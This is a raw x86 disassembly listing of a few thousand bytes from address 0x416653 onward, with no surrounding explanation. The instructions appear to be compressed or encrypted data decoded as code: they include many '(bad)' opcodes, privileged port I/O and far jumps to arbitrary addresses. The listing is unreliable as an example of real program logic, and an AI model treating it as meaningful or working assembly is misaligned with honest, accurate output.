  416653:	push   cs
  416654:	jge    0x41667d
  416656:	mov    ebp,0xc1f09e3
  41665b:	retf   
  41665c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41665d:	enter  0x13de,0x55
  416661:	dec    esi
  416662:	lahf   
  416663:	sahf   
  416664:	stc    
  416665:	mov    eax,0x2e5c55c6
  41666a:	add    eax,0x185e1373
  41666f:	mov    dh,0xa5
  416671:	xor    BYTE PTR [eax+0xd],bl
  416674:	jl     0x4166bd
  416676:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416677:	and    al,0x6d
  416679:	mov    ds:0x58da2335,al
  41667e:	cmp    DWORD PTR [ebp-0x78],0x6e
  416682:	dec    edi
  416683:	test   eax,0x4f15d254
  416688:	daa    
  416689:	adc    eax,0x1683aeef
  41668e:	mov    ds:0x9455a3cf,eax
  416693:	ret    
  416694:	or     DWORD PTR [edx],0x40
  416697:	mov    esi,0x5ac97ef4
  41669c:	add    al,0x8f
  41669e:	outs   dx,BYTE PTR ds:[esi]
  41669f:	mov    DWORD PTR ds:0x8713b027,esp
  4166a5:	mov    esp,?
  4166a7:	jo     0x416721
  4166a9:	jg     0x4166ae
  4166ab:	pop    eax
  4166ac:	cs lods al,BYTE PTR gs:[esi]
  4166af:	loop   0x41663d
  4166b1:	sbb    ah,BYTE PTR [ecx+0x326d8c7b]
  4166b7:	mov    ebx,0x5207c3df
  4166bc:	sbb    DWORD PTR [ebp-0x39],0xffffff9b
  4166c0:	jae    0x41666c
  4166c2:	icebp  
  4166c3:	clc    
  4166c4:	daa    
  4166c5:	test   ebp,0xb81ac75
  4166cb:	lahf   
  4166cc:	das    
  4166cd:	mov    ah,BYTE PTR [ecx+edi*8-0x6e6b5721]
  4166d4:	outs   dx,BYTE PTR ds:[esi]
  4166d5:	mov    al,0xa1
  4166d7:	dec    eax
  4166d8:	mov    ds,WORD PTR [ecx]
  4166da:	mov    dh,BYTE PTR [edi]
  4166dc:	fs pop ecx
  4166de:	retf   0x3f3d
  4166e1:	fcom   QWORD PTR [ecx+edi*4+0x14]
  4166e5:	test   eax,0xeecf8b4d
  4166ea:	out    0x18,eax
  4166ec:	loopne 0x41671e
  4166ee:	loopne 0x416717
  4166f0:	imul   ebp,DWORD PTR [esi+0x3c],0xa53ad8b8
  4166f7:	xchg   ebx,eax
  4166f8:	jnp    0x416706
  4166fa:	sub    ecx,DWORD PTR [esi]
  4166fc:	iret   
  4166fd:	cmp    ebx,DWORD PTR [ebx+ebx*1-0x73dd9585]
  416704:	or     ebx,DWORD PTR [ebx+ecx*8+0xb3971c9]
  41670b:	jp     0x416695
  41670d:	push   0x4177a297
  416712:	cmp    eax,0xfb161a3d
  416717:	aaa    
  416718:	xchg   ebx,eax
  416719:	push   ebx
  41671a:	mov    al,0xa4
  41671c:	and    esi,ebp
  41671e:	and    al,0x39
  416720:	ja     0x416749
  416722:	ret    
  416723:	push   edx
  416724:	sub    ebp,DWORD PTR [ebx-0x5aeb438a]
  41672a:	cmp    BYTE PTR [ebx],0xd0
  41672d:	shr    DWORD PTR [ebx],cl
  41672f:	mov    edi,0x469b3622
  416734:	int3   
  416735:	push   es
  416736:	aam    0xfb
  416738:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416739:	pop    ecx
  41673a:	mov    eax,0x5d5dccbc
  41673f:	lds    ebx,FWORD PTR [ebx-0x3b63ba97]
  416745:	dec    edx
  416746:	pop    ebp
  416747:	and    al,0x24
  416749:	setno  bh
  41674c:	cdq    
  41674d:	nop
  41674e:	rcr    DWORD PTR [edx+0x3b],1
  416751:	xor    DWORD PTR [edi+0x63],0xa24208d0
  416758:	xor    esp,0x40
  41675b:	imul   esp,DWORD PTR [edi-0xb],0xb98f8ef5
  416762:	mov    eax,0x523e61c3
  416767:	cmp    dl,BYTE PTR [ebx+0x46]
  41676a:	mov    edi,0x65b45240
  41676f:	das    
  416770:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  416772:	add    eax,DWORD PTR [esi]
  416774:	push   es
  416775:	call   0x723b:0xff7e9039
  41677c:	mov    eax,0x714d6a93
  416781:	ret    
  416782:	sbb    DWORD PTR [edx],edi
  416784:	cmc    
  416785:	outs   dx,DWORD PTR ds:[esi]
  416786:	(bad)  
  416787:	inc    ecx
  416788:	not    ebp
  41678a:	sbb    cl,BYTE PTR [edi-0x1b]
  41678d:	jo     0x41676e
  41678f:	push   eax
  416790:	imul   eax,ebx,0xc
  416793:	add    eax,0xdbdf3647
  416798:	ins    BYTE PTR es:[edi],dx
  416799:	jae    0x4167ff
  41679b:	push   esi
  41679c:	cli    
  41679d:	fld    QWORD PTR [ecx]
  41679f:	dec    eax
  4167a0:	xchg   BYTE PTR [edx+0x7be32d92],ch
  4167a6:	icebp  
  4167a7:	jae    0x416730
  4167a9:	ffree  st(5)
  4167ab:	pop    esp
  4167ac:	jne    0x4167dc
  4167ae:	cwde   
  4167af:	jb     0x4167ea
  4167b1:	or     al,0x96
  4167b3:	xchg   ebx,eax
  4167b4:	or     bx,dx
  4167b7:	imul   ebp,DWORD PTR [eax-0x2f],0x24ce351d
  4167be:	pop    eax
  4167bf:	ja     0x4167ea
  4167c1:	scas   al,BYTE PTR es:[edi]
  4167c2:	jns    0x4167e6
  4167c4:	mov    BYTE PTR [edx+0x2332baf1],bh
  4167ca:	pushf  
  4167cb:	ds push ds
  4167cd:	inc    ebp
  4167ce:	mov    ch,0x70
  4167d0:	popf   
  4167d1:	jle    0x41683c
  4167d3:	sbb    eax,0xeb26e543
  4167d8:	cs jo  0x4167b4
  4167db:	mov    dh,0xe4
  4167dd:	cwde   
  4167de:	sar    bh,1
  4167e0:	inc    edi
  4167e1:	mov    ?,WORD PTR [ebx-0x33]
  4167e4:	sbb    bl,cl
  4167e6:	inc    eax
  4167e7:	aam    0x13
  4167e9:	repz call 0x4925:0x7ded789c
  4167f1:	push   ds
  4167f2:	and    ch,ch
  4167f4:	(bad)  
  4167f5:	loop   0x416779
  4167f7:	in     eax,0xf2
  4167f9:	mov    dl,0x19
  4167fb:	test   al,dh
  4167fd:	cmp    eax,0xaf41437b
  416802:	sahf   
  416803:	fcmovnu st,st(1)
  416805:	dec    edi
  416806:	test   eax,0xe9e7fc10
  41680b:	push   ecx
  41680c:	push   cs
  41680d:	xor    dl,BYTE PTR [ebx-0x1f962952]
  416813:	cdq    
  416814:	jno    0x4167dc
  416816:	sahf   
  416817:	sub    dh,dl
  416819:	cli    
  41681a:	sbb    esi,eax
  41681c:	lock aad 0x1a
  41681f:	adc    BYTE PTR [edi+ebp*1],bl
  416822:	idiv   ch
  416824:	outs   dx,DWORD PTR ds:[esi]
  416825:	jb     0x416873
  416827:	icebp  
  416828:	jmp    0x8d23ab92
  41682d:	aad    0x11
  41682f:	jns    0x41685c
  416831:	sub    ch,bh
  416833:	mov    BYTE PTR [esi-0x6e],bh
  416836:	out    dx,eax
  416837:	shl    BYTE PTR [ebp+eiz*1-0x63],0x45
  41683c:	adc    eax,0x61d1b620
  416841:	ret    
  416842:	push   cs
  416843:	jg     0x416804
  416845:	xchg   ecx,eax
  416846:	(bad)  
  416848:	out    0xcf,eax
  41684a:	cwde   
  41684b:	dec    eax
  41684c:	push   es
  41684d:	das    
  41684e:	cli    
  41684f:	or     DWORD PTR [ebx],eax
  416851:	mov    esi,es
  416853:	lahf   
  416854:	xchg   ch,al
  416856:	dec    ebx
  416857:	or     BYTE PTR [ebp+0x42],bl
  41685a:	push   ds
  41685b:	adc    al,0x54
  41685d:	(bad)  
  41685e:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  416860:	fist   DWORD PTR [ecx-0x2]
  416863:	dec    eax
  416864:	cli    
  416865:	lods   eax,DWORD PTR ds:[esi]
  416866:	sbb    edi,esp
  416868:	cwde   
  416869:	xchg   esi,eax
  41686a:	mov    ah,0x69
  41686c:	sub    al,0x1f
  41686e:	imul   edi,DWORD PTR [edx-0x7d586dc3],0x3b
  416875:	add    esi,DWORD PTR [ebx]
  416877:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416878:	shr    esi,1
  41687a:	add    eax,0x920736a7
  41687f:	unpcklps xmm5,XMMWORD PTR [eax+0x67fef22e]
  416886:	fcom   QWORD PTR [edi]
  416888:	cmc    
  416889:	fld    TBYTE PTR [ebx+0x1cb6f8df]
  41688f:	jb     0x4168db
  416891:	scas   eax,DWORD PTR es:[edi]
  416892:	cmc    
  416893:	mov    eax,fs:0xb674dd45
  416899:	in     al,dx
  41689a:	jp     0x4168e2
  41689c:	and    BYTE PTR [edx-0x45b245de],ch
  4168a2:	inc    ebp
  4168a3:	xchg   esi,eax
  4168a4:	xchg   ebp,eax
  4168a5:	xchg   ecx,eax
  4168a6:	sub    DWORD PTR [esi],ecx
  4168a8:	test   eax,0x1958d009
  4168ad:	shl    ebp,0x20
  4168b0:	pop    es
  4168b1:	sbb    BYTE PTR [eax+0x47],ah
  4168b4:	xchg   BYTE PTR [esi],ch
  4168b6:	jmp    0xaaa2:0xa4fe8758
  4168bd:	leave  
  4168be:	sbb    DWORD PTR [ecx],0x52
  4168c1:	jp     0x4168bf
  4168c3:	sub    DWORD PTR [edi-0x77],eax
  4168c6:	in     eax,dx
  4168c7:	mov    esi,0x28cef30e
  4168cc:	add    eax,0xcccca90a
  4168d1:	pop    es
  4168d2:	fld    TBYTE PTR [edi+0x188d1cae]
  4168d8:	pop    edx
  4168d9:	nop
  4168da:	mov    dl,0x84
  4168dc:	pop    esp
  4168de:	jp     0x41690c
  4168e0:	sub    BYTE PTR [edi-0x78],bl
  4168e3:	push   es
  4168e4:	dec    edi
  4168e5:	ins    DWORD PTR es:[edi],dx
  4168e6:	repz rcr BYTE PTR [edx+0xa199fbd],1
  4168ed:	fcom   st(0)
  4168ef:	not    DWORD PTR [edi]
  4168f1:	std    
  4168f2:	(bad)  [esi+edx*4-0x4f]
  4168f6:	mov    al,0x0
  4168f8:	fwait
  4168f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168fb:	das    
  4168fc:	xor    eax,0x641dbaa8
  416901:	inc    esi
  416902:	cmp    BYTE PTR [esi],ah
  416904:	shl    BYTE PTR [edx-0x568b7dca],0x75
  41690b:	or     DWORD PTR [esi+0x1063fe1],0xffffffae
  416912:	jge    0x4168a0
  416914:	es lahf 
  416916:	xor    eax,0xca2a1924
  41691b:	jmp    0x4168c9
  41691d:	xor    DWORD PTR [eax-0x3e232a18],edi
  416923:	mov    fs,WORD PTR [ebp+0x14461de3]
  416929:	in     eax,dx
  41692a:	outs   dx,DWORD PTR ds:[esi]
  41692b:	mov    ebx,0x18a25c43
  416930:	jl     0x416977
  416932:	loopne 0x4168e6
  416934:	dec    edi
  416935:	and    DWORD PTR [ebx+0x7a],ebx
  416938:	rcl    BYTE PTR [ebp-0x671c9dc9],1
  41693e:	mov    ss,WORD PTR [eax]
  416940:	test   eax,0x6ef39338
  416945:	xor    esi,DWORD PTR [ecx+0x2c]
  416948:	fcomip st,st(0)
  41694a:	jmp    0x416920
  41694c:	stos   BYTE PTR es:[edi],al
  41694d:	popa   
  41694e:	adc    edi,edi
  416950:	and    DWORD PTR [ecx-0x65e79a92],ebp
  416956:	lahf   
  416957:	shl    cl,cl
  416959:	adc    BYTE PTR [eax+0xb],0xf1
  41695d:	jg     0x416905
  41695f:	daa    
  416960:	pop    es
  416961:	(bad)  
  416962:	lock out 0x49,eax
  416965:	push   ds
  416966:	sahf   
  416967:	add    DWORD PTR [eax+edi*2],eax
  41696a:	addr16 push 0x200130ad
  416970:	pop    ds
  416971:	pop    ss
  416972:	orps   xmm1,XMMWORD PTR ds:0x7c958d4e
  416979:	call   0x652618cc
  41697e:	mov    eax,ds:0x2528af5c
  416983:	xchg   ebx,eax
  416984:	push   esp
  416985:	sti    
  416986:	or     ebx,0xffffff88
  416989:	ud0    eax,DWORD PTR [ebp+0x3eb79f9a]
  416990:	jle    0x416970
  416992:	pop    edi
  416993:	fist   DWORD PTR [ebp+0x3862f62d]
  416999:	sbb    DWORD PTR [esi],edx
  41699b:	and    BYTE PTR [eax+0x5c7a188a],ah
  4169a1:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169a3:	ss cmp dh,ch
  4169a6:	mov    bh,dh
  4169a8:	int    0x41
  4169aa:	ja     0x41696e
  4169ac:	mov    edi,DWORD PTR [ebx-0x9f42b45]
  4169b2:	mov    dl,0xf7
  4169b4:	push   eax
  4169b5:	outs   dx,DWORD PTR ds:[esi]
  4169b6:	repnz sti 
  4169b8:	lahf   
  4169b9:	inc    ebp
  4169ba:	adc    DWORD PTR [eax+0xd],eax
  4169bd:	push   0xffffff92
  4169bf:	ror    DWORD PTR [esp+ecx*4+0x2491e17e],cl
  4169c6:	cld    
  4169c7:	and    edx,esp
  4169c9:	icebp  
  4169ca:	ins    DWORD PTR es:[edi],dx
  4169cb:	lea    edi,[edx-0xe]
  4169ce:	sub    BYTE PTR [ebx+0x38c010ff],al
  4169d4:	fwait
  4169d5:	gs inc esi
  4169d7:	outs   dx,BYTE PTR ds:[esi]
  4169d8:	dec    edx
  4169d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169da:	inc    edi
  4169db:	jb     0x416a2e
  4169dd:	into   
  4169de:	in     eax,dx
  4169df:	push   es
  4169e0:	inc    ebx
  4169e1:	xor    DWORD PTR [ebx+edi*1-0x5c],edi
  4169e5:	rcl    eax,0x20
  4169e8:	pop    es
  4169e9:	xor    DWORD PTR ds:[edx+0xe],edx
  4169ed:	and    DWORD PTR [ebp-0x8],eax
  4169f0:	mov    ebp,0x87c00874
  4169f5:	ret    
  4169f6:	sbb    al,0x7
  4169f8:	add    eax,0x1feffce0
  4169fd:	loopne 0x416a6a
  4169ff:	adc    BYTE PTR [esi-0x5bbccdb5],bl
  416a05:	mov    edi,0x173a623d
  416a0a:	xor    ebp,DWORD PTR [eax-0xb]
  416a0d:	ret    0xbfaa
  416a10:	xchg   edi,eax
  416a11:	xor    edx,eax
  416a13:	lods   eax,DWORD PTR ds:[esi]
  416a14:	inc    edx
  416a15:	and    eax,0xe2daf797
  416a1a:	out    dx,al
  416a1b:	rol    BYTE PTR [edi],1
  416a1d:	in     al,dx
  416a1e:	lods   eax,DWORD PTR ds:[esi]
  416a1f:	jne    0x4169f4
  416a21:	mov    bh,0x51
  416a23:	out    0xde,eax
  416a25:	push   edx
  416a26:	cld    
  416a27:	sbb    bh,0xe2
  416a2a:	push   0x3b474512
  416a2f:	pop    ebx
  416a30:	cmc    
  416a31:	push   esi
  416a32:	dec    edx
  416a33:	adc    bl,dl
  416a35:	push   esi
  416a36:	adc    ch,0xd4
  416a39:	pop    ds
  416a3a:	add    bh,BYTE PTR [ecx-0x1b]
  416a3d:	cmp    eax,0x128fbd1c
  416a42:	mov    eax,ds:0xfef1fb0d
  416a47:	jecxz  0x416a4b
  416a49:	add    bh,BYTE PTR [edi]
  416a4b:	jmp    0x3599aa03
  416a50:	mov    esi,0xf821f00e
  416a55:	mov    ecx,0x7ec2ce2c
  416a5a:	xchg   BYTE PTR es:[edx+0x6c2acc81],bl
  416a61:	jge    0x416abf
  416a63:	in     al,0x14
  416a65:	sub    BYTE PTR [ecx+0x2e],dh
  416a68:	sbb    BYTE PTR [edx+0x10],dh
  416a6b:	and    DWORD PTR cs:[ebx+edx*8-0x1becf956],0x18
  416a74:	inc    edx
  416a75:	mov    cl,0xa0
  416a77:	repz mov esp,0x21ffc9a7
  416a7d:	push   es
  416a7e:	add    al,0x82
  416a80:	iret   
  416a81:	(bad)  
  416a82:	xchg   edi,eax
  416a83:	pushf  
  416a84:	add    BYTE PTR [esi-0x75],bl
  416a87:	sub    eax,0x5308e50
  416a8c:	cmp    BYTE PTR ds:0x86ab53b0,ah
  416a92:	mov    al,0xf
  416a94:	jae    0x416af3
  416a96:	das    
  416a97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a98:	mov    gs,WORD PTR [edi+0x0]
  416a9b:	cmp    dh,ch
  416a9d:	imul   esi,DWORD PTR ds:0xd48aa73b,0x1e0532bc
  416aa7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416aa8:	push   esi
  416aaa:	clc    
  416aab:	adc    eax,0x3e41c461
  416ab0:	cmc    
  416ab1:	jmp    0x416ad5
  416ab3:	or     eax,0x84643aca
  416ab8:	or     eax,0x85b31093
  416abd:	and    edx,DWORD PTR [ecx+0x8497fdf]
  416ac3:	push   cs
  416ac4:	add    al,0x2f
  416ac6:	pop    ds
  416ac7:	repnz stos DWORD PTR es:[edi],eax
  416ac9:	xchg   ebx,esi
  416acb:	out    0xa1,eax
  416acd:	pop    es
  416ace:	push   0xdc7d3c51
  416ad3:	imul   edi,eax,0x32012196
  416ad9:	fbld   TBYTE PTR [eax]
  416adb:	(bad)  
  416adc:	in     al,dx
  416add:	push   edi
  416ade:	sub    ch,BYTE PTR [edi]
  416ae0:	jl     0x416ab0
  416ae2:	xor    eax,0xfc9018e8
  416ae7:	dec    esp
  416ae8:	fidivr DWORD PTR [edx-0x2814f552]
  416aee:	jl     0x416ad5
  416af0:	ret    
  416af1:	lds    esi,FWORD PTR [esi-0x62]
  416af4:	loop   0x416b31
  416af6:	mov    ebp,ss
  416af8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416af9:	stc    
  416afa:	out    dx,al
  416afb:	stos   DWORD PTR es:[edi],eax
  416afc:	frstor [esi-0x45]
  416aff:	xchg   ebx,eax
  416b00:	mov    BYTE PTR [ebp-0x4fafa14c],ah
  416b06:	inc    ebp
  416b07:	adc    al,0x77
  416b09:	cmp    eax,0x9cae689a
  416b0e:	leave  
  416b0f:	cmp    dl,ah
  416b11:	xchg   edx,eax
  416b12:	xor    eax,0x53c27112
  416b17:	fisttp QWORD PTR [esi]
  416b19:	mov    bl,0x4f
  416b1b:	jne    0x416b56
  416b1d:	add    BYTE PTR [ebp+0x588a03e3],0x53
  416b24:	es sbb dl,cl
  416b27:	sbb    dl,BYTE PTR [ecx-0x34]
  416b2a:	(bad)  
  416b2c:	scas   al,BYTE PTR es:[edi]
  416b2d:	fmul   QWORD PTR [ebp+0x79087557]
  416b33:	cdq    
  416b34:	jo     0x416b85
  416b36:	loopne 0x416b28
  416b38:	mov    ebp,0xbddb7cff
  416b3d:	add    DWORD PTR [eax-0x6eeac428],esi
  416b43:	enter  0x278e,0xd0
  416b47:	jbe    0x416b55
  416b49:	jne    0x416b62
  416b4b:	inc    ebx
  416b4c:	cld    
  416b4d:	std    
  416b4e:	inc    edx
  416b4f:	fxch   st(1)
  416b51:	xchg   edx,eax
  416b52:	out    0x81,eax
  416b54:	loope  0x416b29
  416b56:	or     al,0x85
  416b58:	jo     0x416af0
  416b5a:	int    0x29
  416b5c:	jnp    0x416b31
  416b5e:	dec    eax
  416b5f:	cmp    al,0xa1
  416b61:	and    ch,al
  416b63:	ds test edx,0x3a8dafe5
  416b6a:	mov    WORD PTR [edx-0x5d903fcf],gs
  416b70:	shl    DWORD PTR ds:0xfb0ef95b,cl
  416b76:	pop    ebp
  416b77:	test   eax,0x21a2eab4
  416b7c:	and    ebx,esp
  416b7e:	xchg   ah,ch
  416b80:	and    DWORD PTR [esi],esp
  416b82:	sbb    esp,edx
  416b84:	js     0x416bf8
  416b86:	in     eax,dx
  416b87:	icebp  
  416b88:	sbb    eax,0x537fa1d0
  416b8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b8e:	mov    ecx,DWORD PTR [ebx+0x70]
  416b91:	xchg   esi,eax
  416b92:	cmp    eax,0xdf1715a4
  416b97:	inc    ebp
  416b98:	test   DWORD PTR [esi],edx
  416b9a:	call   DWORD PTR ds:0x60ebb179
  416ba0:	add    eax,0x4d604b4a
  416ba5:	mov    ds:0xf38af00,eax
  416baa:	mov    ebp,DWORD PTR [eax+0x3b]
  416bad:	xchg   esp,eax
  416bae:	repz fs jae 0x416b33
  416bb2:	jo     0x416bed
  416bb4:	sbb    DWORD PTR [edx],edx
  416bb6:	gs rcl dh,cl
  416bb9:	xor    DWORD PTR [ebx+0x5d],edi
  416bbc:	das    
  416bbd:	test   al,0x65
  416bbf:	outs   dx,DWORD PTR ds:[esi]
  416bc0:	mov    esp,0x2c39ae6a
  416bc5:	push   edi
  416bc6:	mov    ds:0xda918a9a,eax
  416bcb:	xchg   edx,eax
  416bcc:	aaa    
  416bcd:	fild   QWORD PTR [ebx]
  416bcf:	cld    
  416bd0:	iret   
  416bd1:	add    al,0x52
  416bd3:	fisubr DWORD PTR ss:[eax]
  416bd6:	pop    ds
  416bd7:	mov    DWORD PTR [ebx-0x61329597],esp
  416bdd:	push   edi
  416bde:	adc    al,BYTE PTR [edx+0x32b5d34a]
  416be4:	ins    DWORD PTR es:[edi],dx
  416be5:	rcl    DWORD PTR [ecx+ecx*2+0x4],1
  416be9:	sbb    al,0x20
  416beb:	xchg   ecx,eax
  416bec:	(bad)  
  416bed:	inc    ebx
  416bee:	fidivr WORD PTR gs:[esi-0x38c638a4]
  416bf5:	jb     0x416baf
  416bf7:	push   edi
  416bf8:	xchg   esp,eax
  416bf9:	add    esi,ebx
  416bfb:	or     al,0xdf
  416bfd:	mov    ecx,0x2a27750c
  416c02:	rcr    BYTE PTR [eax],0xd2
  416c05:	add    edx,DWORD PTR [edi]
  416c07:	jge    0x416be8
  416c09:	and    BYTE PTR [esi],cl
  416c0b:	push   ecx
  416c0c:	fadd   QWORD PTR [ecx+0x774ff9f7]
  416c12:	dec    eax
  416c13:	cmp    ch,dl
  416c15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c16:	cmp    DWORD PTR [eax],edx
  416c18:	add    al,0x93
  416c1a:	in     al,dx
  416c1b:	cmp    BYTE PTR [esi+0x3be85a61],ah
  416c21:	and    edx,edi
  416c23:	jbe    0x416be0
  416c25:	dec    edi
  416c26:	push   ebx
  416c27:	mov    ecx,0x3c4fd49f
  416c2c:	sbb    eax,0x6f1e5bab
  416c31:	sub    DWORD PTR [eax-0x48],esi
  416c34:	push   ss
  416c35:	adc    bh,BYTE PTR [eax-0xa]
  416c38:	pop    ebx
  416c39:	cli    
  416c3a:	ja     0x416c51
  416c3c:	push   eax
  416c3d:	test   al,0x95
  416c3f:	push   eax
  416c40:	inc    ebp
  416c41:	inc    ebx
  416c42:	imul   ecx,DWORD PTR [edx+ecx*4],0xd65eea10
  416c49:	aad    0xb
  416c4b:	push   eax
  416c4c:	imul   esp,DWORD PTR [ebp+0x2f86404b],0x515702cc
  416c56:	mov    bh,0x37
  416c58:	adc    al,0x49
  416c5a:	mov    WORD PTR [ebx],cs
  416c5c:	push   ss
  416c5d:	(bad)  
  416c5e:	out    dx,al
  416c5f:	mov    esp,0xb38f14ef
  416c64:	sbb    eax,0xea5be37d
  416c69:	sub    ecx,esp
  416c6b:	xchg   edx,eax
  416c6c:	ins    DWORD PTR es:[edi],dx
  416c6d:	dec    edx
  416c6e:	out    dx,eax
  416c6f:	xchg   ebp,eax
  416c70:	xchg   esp,eax
  416c71:	jne    0x416c55
  416c73:	fstp   DWORD PTR [ebx-0x1d]
  416c76:	mov    BYTE PTR [edx],bl
  416c78:	pop    ds
  416c79:	imul   eax,DWORD PTR [edi-0x70c3c64f],0x1a466579
  416c83:	sbb    eax,0x38b64d57
  416c88:	lea    eax,[edx-0x23]
  416c8b:	fmul   st(3),st
  416c8d:	shl    DWORD PTR [edx+0x17758cd9],1
  416c93:	cs lock dec ebp
  416c96:	mov    ebp,0xfa8047cc
  416c9b:	or     esi,edi
  416c9d:	dec    esi
  416c9e:	push   ecx
  416c9f:	(bad)  
  416ca0:	and    al,0x45
  416ca2:	xchg   edi,eax
  416ca3:	lock shr BYTE PTR [ebx],1
  416ca6:	in     al,dx
  416ca7:	loopne 0x416c51
  416ca9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416caa:	mov    es,WORD PTR fs:[ecx+0x7f6ad90e]
  416cb1:	mov    edx,0x8c5996ee
  416cb6:	pop    ds
  416cb7:	sbb    DWORD PTR [edi],ebp
  416cb9:	inc    edi
  416cba:	pop    edi
  416cbb:	fcmovnbe st,st(7)
  416cbd:	pop    esi
  416cbe:	push   esi
  416cbf:	es mov dl,0xf6
  416cc2:	popf   
  416cc3:	dec    esi
  416cc4:	cmc    
  416cc5:	and    ecx,ebx
  416cc7:	pop    edx
  416cc8:	addr16 jne 0x416cd1
  416ccb:	pop    ebp
  416ccc:	adc    dl,dl
  416cce:	push   edi
  416ccf:	ins    BYTE PTR es:[edi],dx
  416cd0:	call   0xd89c:0x2fb6efc3
  416cd7:	push   eax
  416cd8:	push   eax
  416cd9:	out    0xd3,al
  416cdb:	pop    ds
  416cdc:	jno    0x416cb4
  416cde:	add    ah,BYTE PTR es:[ebp-0x60262557]
  416ce5:	mov    cl,dh
  416ce7:	jle    0x416d13
  416ce9:	out    dx,eax
  416cea:	inc    eax
  416ceb:	adc    DWORD PTR [ebp+0x67],eax
  416cee:	out    0x27,eax
  416cf0:	cmp    BYTE PTR [esi+0x42],ch
  416cf3:	and    ecx,ebx
  416cf5:	adc    eax,0x43733a69
  416cfa:	jne    0x416d41
  416cfc:	jg     0x416ca1
  416cfe:	retf   
  416cff:	retf   
  416d00:	ret    
  416d01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d02:	jne    0x416d06
  416d04:	xchg   esi,eax
  416d05:	sub    al,0x70
  416d07:	cli    
  416d08:	cli    
  416d09:	(bad)  
  416d0a:	shl    BYTE PTR [eax-0x1b],1
  416d0d:	xor    esp,DWORD PTR [edi]
  416d0f:	lahf   
  416d10:	loopne 0x416ccf
  416d12:	cmp    eax,0x48c6a2a6
  416d17:	ins    DWORD PTR es:[edi],dx
  416d18:	test   eax,0x317ff53
  416d1d:	or     eax,0xa92146d8
  416d22:	out    0x1a,al
  416d24:	inc    edi
  416d25:	xor    dl,ah
  416d27:	or     BYTE PTR [ebx+0x3c60caf8],bh
  416d2d:	or     ebx,edi
  416d2f:	je     0x416ced
  416d31:	mov    edx,0x8d6b977d
  416d36:	ds dec esi
  416d38:	lods   al,BYTE PTR ds:[esi]
  416d39:	lds    eax,FWORD PTR [eax-0x33fa880c]
  416d3f:	outs   dx,BYTE PTR ds:[esi]
  416d40:	mov    BYTE PTR [ecx+0x5a04b2bf],al
  416d46:	mov    WORD PTR [ecx+0x12],ds
  416d49:	rcl    DWORD PTR [ebp+eax*8+0x7099700d],1
  416d50:	je     0x416dbe
  416d52:	pop    esp
  416d53:	dec    ebp
  416d54:	jge    0x416cf5
  416d56:	xor    al,0x9
  416d58:	add    esp,DWORD PTR [ebx-0xc2fe33b]
  416d5e:	push   ebx
  416d5f:	add    BYTE PTR [ecx],ah
  416d61:	and    ebp,DWORD PTR [ebp-0x52305bf2]
  416d67:	fild   DWORD PTR [ebx]
  416d69:	(bad)  
  416d6b:	adc    DWORD PTR [edx+0x2fcd8631],edx
  416d71:	pop    ecx
  416d72:	adc    ebx,esp
  416d74:	inc    eax
  416d75:	out    dx,al
  416d76:	mov    bl,0x1
  416d78:	xchg   edi,eax
  416d79:	int3   
  416d7a:	xor    BYTE PTR [ecx+eax*8-0x37],ah
  416d7e:	sub    DWORD PTR [ecx-0x48],esi
  416d81:	rcr    DWORD PTR [ebp+edx*8-0x23117bf1],1
  416d88:	cmp    esi,DWORD PTR [edx]
  416d8a:	mov    al,ds:0xebc35c90
  416d8f:	xor    eax,0x4adf32eb
  416d94:	mov    ebx,0x2913f41e
  416d99:	pusha  
  416d9a:	push   esp
  416d9b:	push   es
  416d9c:	into   
  416d9d:	rol    DWORD PTR [esi],0x88
  416da0:	pop    ebp
  416da1:	fst    DWORD PTR [edi-0x1a]
  416da4:	adc    ch,bl
  416da6:	iret   
  416da7:	leave  
  416da8:	call   0x372cd681
  416dad:	pop    es
  416dae:	dec    si
  416db0:	or     al,0xf9
  416db2:	push   es
  416db3:	jecxz  0x416d89
  416db5:	addr16 cmp eax,0x7ad24da2
  416dbb:	dec    ebx
  416dbc:	test   al,0x65
  416dbe:	xor    DWORD PTR [edi+esi*8+0x53753772],edx
  416dc5:	xor    eax,0x368b9d6e
  416dca:	fidivr WORD PTR [eax]
  416dcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416dcd:	aad    0x5e
  416dcf:	xor    esp,DWORD PTR [edx]
  416dd1:	imul   esp,DWORD PTR [edx-0x734e8e56],0x57a41e17
  416ddb:	imul   esp,DWORD PTR [eax-0x1a8ad3da],0x930af13e
  416de5:	and    bl,BYTE PTR [esi+0x22]
  416de8:	cmp    BYTE PTR [edx],ah
  416dea:	jp     0x416e2a
  416dec:	push   ss
  416ded:	jnp    0x416db8
  416def:	bound  edx,QWORD PTR [edx-0x4f63249f]
  416df5:	sbb    bl,BYTE PTR [ecx]
  416df7:	dec    edi
  416df8:	mov    edx,esp
  416dfa:	in     eax,0x31
  416dfc:	mov    ebx,0x8255ff09
  416e01:	hlt    
  416e02:	mov    bl,0xca
  416e04:	mov    bl,0x4b
  416e06:	inc    esi
  416e07:	lea    ebx,[ebx+0x4a]
  416e0a:	pop    ebp
  416e0b:	sahf   
  416e0c:	or     cl,bl
  416e0e:	or     DWORD PTR [ebx],ebp
  416e10:	sbb    eax,DWORD PTR [ebx+0x56]
  416e13:	or     eax,0x66cfce68
  416e18:	mov    edi,0xcc974231
  416e1d:	sub    eax,0xd471edd0
  416e22:	push   cs
  416e23:	(bad)  
  416e25:	out    dx,eax
  416e26:	jg     0x416ea2
  416e28:	add    eax,DWORD PTR [eax+0x6]
  416e2b:	mov    bl,0x4d
  416e2d:	inc    eax
